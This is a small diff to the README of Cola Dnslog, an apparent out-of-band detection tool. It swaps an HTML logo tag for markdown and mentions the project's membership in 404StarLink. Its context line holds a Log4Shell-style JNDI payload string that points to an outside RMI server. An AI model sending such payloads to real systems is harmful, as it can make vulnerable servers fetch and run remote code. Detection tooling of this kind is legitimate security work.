@@ -427,7 +427,7 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
 
 
 ## 404星链计划
-<img src="https://github.com/knownsec/404StarLink-Project/raw/master/logo.png">
+![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)
 
 Cola Dnslog 现已加入 [404星链计划](https://github.com/knownsec/404StarLink)
 
